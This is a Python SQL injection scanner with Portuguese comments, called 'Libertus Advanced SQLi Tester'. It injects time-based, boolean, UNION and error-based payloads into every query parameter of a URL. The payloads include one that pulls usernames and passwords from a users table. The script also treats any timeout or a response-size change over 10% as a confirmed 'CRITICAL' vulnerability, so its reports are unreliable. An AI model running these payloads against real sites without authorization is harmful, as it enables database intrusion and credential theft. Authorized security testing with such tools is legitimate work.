#!/usr/bin/env python3
"""
LIBERTUS ADVANCED SQLi TESTER

Testa SQL Injection em TODOS os parâmetros usando:
1. Time-based blind SQLi
2. Boolean-based blind SQLi
3. Union-based SQLi
4. Error-based SQLi
5. Stacked queries
"""

import asyncio
import aiohttp
import time
from typing import List, Dict, Tuple
from urllib.parse import urlparse, parse_qs, urlencode


class LibertusAdvancedSQLi:
    """Tester avançado de SQL Injection"""
    
    def __init__(self):
        # Payloads categorizados
        self.payloads = {
            'time_based': [
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            'boolean_based': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "' OR 'x'='x",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                "' UNION ALL SELECT NULL--",
            ],
            'error_based': [
                "'",
                "''",
                "1' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
            ]
        }
    
    async def test_url(self, url: str) -> List[Dict]:
        """Testa URL completa para SQLi"""
        
        vulnerabilities = []
        
        print(f"🔍 Testing SQLi: {url}")
        
        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("   ⚠️ Nenhum parâmetro encontrado")
            return vulnerabilities
        
        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"   📝 Testando parâmetro: {param_name}")
            
            # Time-based
            vuln = await self._test_time_based(url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                print(f"      💥 TIME-BASED SQLi DETECTADO!")
            
            # Boolean-based
            vuln = await self._test_boolean_based(url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                print(f"      💥 BOOLEAN-BASED SQLi DETECTADO!")
            
            # Union-based
            vuln = await self._test_union_based(url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                print(f"      💥 UNION-BASED SQLi DETECTADO!")
        
        return vulnerabilities
    
    async def _test_time_based(self, url: str, param: str) -> Dict:
        """Testa time-based blind SQLi"""
        
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads['time_based']:
                # Injeta payload
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    start = time.time()
                    
                    async with session.get(test_url, timeout=10) as resp:
                        elapsed = time.time() - start
                        
                        # Se demorou >= 5s, é vulnerável
                        if elapsed >= 5:
                            return {
                                'type': 'sqli_time_based',
                                'param': param,
                                'payload': payload,
                                'url': url,
                                'evidence': f"Response time: {elapsed:.2f}s (expected 5s+)",
                                'severity': 'CRITICAL'
                            }
                
                except asyncio.TimeoutError:
                    # Timeout também indica vulnerabilidade
                    return {
                        'type': 'sqli_time_based',
                        'param': param,
                        'payload': payload,
                        'url': url,
                        'evidence': 'Request timeout (10s+)',
                        'severity': 'CRITICAL'
                    }
                
                except:
                    continue
        
        return None
    
    async def _test_boolean_based(self, url: str, param: str) -> Dict:
        """Testa boolean-based blind SQLi"""
        
        async with aiohttp.ClientSession() as session:
            # Baseline request
            baseline_url = url
            
            try:
                async with session.get(baseline_url, timeout=5) as resp:
                    baseline_content = await resp.text()
                    baseline_len = len(baseline_content)
            except:
                return None
            
            # Testa payloads
            for payload in self.payloads['boolean_based']:
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    async with session.get(test_url, timeout=5) as resp:
                        test_content = await resp.text()
                        test_len = len(test_content)
                        
                        # Diferença significativa no tamanho = vulnerável
                        diff_percent = abs(test_len - baseline_len) / baseline_len * 100
                        
                        if diff_percent > 10:  # +10% diferença
                            return {
                                'type': 'sqli_boolean_based',
                                'param': param,
                                'payload': payload,
                                'url': url,
                                'evidence': f"Response size change: {diff_percent:.1f}%",
                                'severity': 'CRITICAL'
                            }
                
                except:
                    continue
        
        return None
    
    async def _test_union_based(self, url: str, param: str) -> Dict:
        """Testa union-based SQLi"""
        
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads['union_based']:
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    async with session.get(test_url, timeout=5) as resp:
                        content = await resp.text()
                        
                        # Procura por indicadores de sucesso
                        indicators = [
                            'mysql',
                            'sqlite',
                            'postgresql',
                            'mssql',
                            'syntax error',
                            'sql error',
                            'database error',
                            'query failed'
                        ]
                        
                        for indicator in indicators:
                            if indicator in content.lower():
                                return {
                                    'type': 'sqli_union_based',
                                    'param': param,
                                    'payload': payload,
                                    'url': url,
                                    'evidence': f"Found indicator: '{indicator}'",
                                    'severity': 'CRITICAL'
                                }
                
                except:
                    continue
        
        return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Injeta payload no parâmetro"""
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Substitui valor do parâmetro
        params[param] = [payload]
        
        # Reconstrói URL
        new_query = urlencode(params, doseq=True)
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        return new_url


async def main():
    """Teste"""
    tester = LibertusAdvancedSQLi()
    
    # URL de teste
    test_url = "https://example.com/search?q=test&category=all"
    
    vulnerabilities = await tester.test_url(test_url)
    
    print("\n" + "="*60)
    print(f"✅ SQLi vulnerabilities found: {len(vulnerabilities)}")
    
    for vuln in vulnerabilities:
        print(f"\n💥 {vuln['type'].upper()}")
        print(f"   Parameter: {vuln['param']}")
        print(f"   Payload: {vuln['payload']}")
        print(f"   Evidence: {vuln['evidence']}")


if __name__ == "__main__":
    asyncio.run(main())
